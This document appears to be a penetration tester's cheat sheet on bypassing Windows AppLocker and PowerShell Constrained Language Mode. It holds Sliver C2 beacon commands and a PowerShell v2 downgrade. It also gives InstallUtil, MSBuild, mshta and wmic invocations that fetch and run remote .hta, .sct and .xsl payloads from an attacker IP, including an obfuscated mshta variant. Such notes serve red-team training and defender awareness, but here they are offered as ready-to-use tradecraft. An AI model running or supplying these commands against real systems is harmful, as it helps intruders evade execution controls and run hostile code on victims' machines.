# AppLocker - CLM Bypass

## **AppLocker**

AppLocker is a windows feature designed to control which users can run what programs. Uses rules for executables with a Publisher signature; allow anything signed by Microsoft - File Path, File Hash or by User or Security Group Scope assignment.

AppLocker is a binary-level execution control policy that determines which apps or scripts can or cannot run based on:

* File Path
* Publisher signature
* User and Security Group scoping
* Targets specific filetypes.

AppLocker covers the following filetypes:

* Executables - `.exe`, `.dll`
* Installers - `.msi`, `.msp`
* Scripts - `.bat`, `.cmd`, `.vbs`, `.js`, `.ps1`

Many AppLocker Rules are configured to block unsigned or non-whitelisted `.exe` files. AppLocker doesn't care where the binary comes from, but where (whitelisted directory) it runs it from, the file type, and if its signed or not.

## Constrained Language Mode (CLM)&#x20;

Constrained Language Mode (CLM) is a security feature in PowerShell designed to limit the use of potentially dangerous APIs and .NET features. When active, CLM limits PowerShell to a small subset of its full functionality, disabling powerfull features:&#x20;

* COM Object creation
* Reflection (`Invoke-ReflectivePEInjection`, `Add-Type`, etc)
* Invocation of dynamically compiled code
* Access to custom .NET assemblies

## LOLBINs&#x20;

LOLBINs or Living off the Land Binaries are commonly used Microsoft utilities that allow the ability to bypass AppLocker and CLM restrictions usually set through Group Policies (GPO). These conditions apply to the following:&#x20;

* InstallUltil.exe
* MSBuild.exe
* MSHTA.exe
* WMIC (XSL)

#### AppLocker Bypass Conditions

* installutil.exe is a Microsoft-signed binary
* located in whitelisted paths `` C:\Windows\...` ``&#x20;
* not commonly blocked

#### CLM Bypass Conditions

* Creating run-space for powershell to execute within .NET assembly (running via LOLBINs)
* Can run powershell in memory



***

## CLM Bypass

### Enumeration

```powershell
# powershell commandlet to run
PS C:\Windows\Temp > $ExecutionContext.SessionState.LanguageMode
# expected output if CLM is enabled
Mode
ConstrainedLanguage
```

### Sliver - Constrained Language Mode (CLM) Bypass

{% code overflow="wrap" %}
```bash
# For disabling in sliver, leverage sharpsh with its built in CLM bypass
sliver (beacon) > sharpsh -- -c '$ExecutionContext.SessionState.LanguageMode'

# For use with the CLM bypass executable - however unnecessary in most cases or need to use a windows terminal (sliver shell mode) 
sliver (beacon) > sideload /home/kali/ToolLibrary/CLMBypass/CLMBypass.exe

# All sliver shell code runners will be located in ToolLibrary/Sliver-Setup and ToolLibrary/Sliver-Setup-HTTPS
```
{% endcode %}

### Shell - Constrained Language Mode (CLM) Bypass

```bash
# a PowerShell downgrade to version 2,
C:\> powershell.exe -version 2

# Creating a new runspace with COM objects,
PS C:\> New-Object -ComObject WScript.Shell
```

***

## AppLocker Bypass

### Enumeration

```bash
# Find whitelisted directories
\home\kali\ToolLibrary\AppLocker-Enum\enumeratePaths.ps1

# Run via sliver interactive
sliver > sharpsh -- '-u http://192.168.45.227/enumeratePaths.ps1`
```

***

## InstallUtil

using `InstallUtil.exe` is a classic LOLBIN (Living Off The Land Binary) technique that can bypass AppLocker and CLM  under certain conditions for .NET-based payload delivery.&#x20;

### References

```bash
# utility location
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe

# Basic Execution
InstallUtil.exe /logfile= /LogToConsole=false /u payload.exe
```

***

## MSBuild

using `msbuild.exe` is another LOLBIN that uses Microsoft's build engine for compiling .NET applications that can also execute inline tasks (embedded C# code) making it an ideal candidate to bypass AppLocker and CLM restrictions.&#x20;

### References

```bash
# utility location (32-bit)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
# utility location (64 bit)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe

# Basic Execution
MSBuild.exe bypass.xml
```

***

## MSHTA

using `mshta.exe` is another LOLBIN that uses Microsoft's HTML Applications (MSHTA) to bypass AppLocker and CLM. This is used to execute embedded scripts (`vbscript` or `jscript`) within an `payload.hta` file with full access to Windows Script Host environment.&#x20;

### References

{% code overflow="wrap" %}
```bash
# utility location (32-bit)
C:\Windows\System32\mshta.exe
# utility location (64-bit)
C:\Windows\SysWOW64\mshta.exe

# Basic Execution
mshta.exe http://192.168.45.227/bypass.hta

# Basic Execution of jscript
mshta.exe "javascript:GetObject('script:http://192.168.45.277/bypass.sct');close();"
# slightly offuscated Execution of Jscript
mshta.exe "javascript:a=GetObject;b='script:http://192.168.45.227/bypass.sct';a(b);close();"
```
{% endcode %}

***

## XSL - WMIC

Windows Management Instrumentation Command-Line (WMIC) is another Microsoft-signed binary LOLBIN desinged to query and control system management information. WMIC has capability to parse and execute XSL (XML Stylesheet Langauge) files and be abused to execute malicious scripts or binaries.&#x20;

### References

```bash
# utility location
C:\Windows\System32\wbem\wmic.exe

# Basic execution
wmic process get /format:"http://192.168.45.227/bypass.xsl"
```
